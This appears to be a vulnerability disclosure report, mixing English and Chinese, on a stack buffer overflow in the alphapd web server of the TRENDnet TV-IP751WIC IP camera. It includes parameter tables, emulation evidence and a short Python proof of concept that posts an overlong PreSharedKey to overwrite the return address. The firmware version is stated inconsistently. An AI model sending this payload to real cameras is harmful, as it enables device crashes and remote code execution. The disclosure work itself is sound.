# Technical Report: CVE-XXXX-XXXX10: TV-IP751WIC alphapd Wifi Key/SSID Stack Overflow

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TV-IP751WIC Wireless IP Camera |
| Firmware / Version | v11.03.03 |
| Affected Component | bin/alphapd |
| Vulnerability Type | Stack-based Buffer Overflow / RCE |
| CWE | CWE-121 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-751wic-alphapd-wifi-key-overflow |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TV-IP751WIC Wireless IP Camera affecting bin/alphapd. The issue is categorized as Stack-based Buffer Overflow / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX10: TV-IP751WIC alphapd Wifi Key/SSID Stack Overflow

| 厂商 TRENDnet | 产品 TV-IP751WIC v1.1.03.03 |
| 二进制 `bin/alphapd` | CWE-121 | CVSS **9.8 Critical** |

## 1. 漏洞概述

摄像头 Wi-Fi 配置处理函数 `SystemWirelessChanged` (0x4201D8) 通过 `websGetVar()`/`nvram_bufget()` 读取 WEP 密钥、WPA PreSharedKey、TxKey、SSID 等 WiFi 参数后，使用 `sprintf`/`strcpy` 无界复制到固定大小栈缓冲区。

## 2. FirmRec 证据

Simexp: **17次** 0x41414141 命中 (CVE-2022-29395 @ 0x4201D8, single function)

### 受影响参数（全部在 SystemWirelessChanged 内）

| 参数 | 来源 | 命中次数 | 类型 |
|------|------|---------|------|
| Key1/Key2/Key3/Key4 | websGetVar/nvram_bufget | 各4次 | WEP密钥栈溢出 |
| PreSharedKey | websGetVar/nvram_bufget | 17次 | WPA密钥栈溢出 |
| TxKey | websGetVar/nvram_bufget | 13次 | 发送密钥栈溢出 |
| WEPKeyFormat | websGetVar/nvram_bufget | 4次 | 格式栈溢出 |
| AuthenticationType | websGetVar/nvram_bufget | 4次 | 认证类型栈溢出 |
| SSID | websGetVar (0x4346088) | 1次 | SSID栈溢出 |

## 3. PoC

```python
import requests
# 超长 PreSharedKey 触发栈溢出
requests.post("http://CAMERA_IP/cgi-bin/admin/wireless.cgi", data={
    "AuthenticationType": "WPA2PSK",
    "PreSharedKey": "A" * 80 + "\x41\x41\x41\x41",  # 溢出 $ra
    "SSID": "MyCamera",
})
```

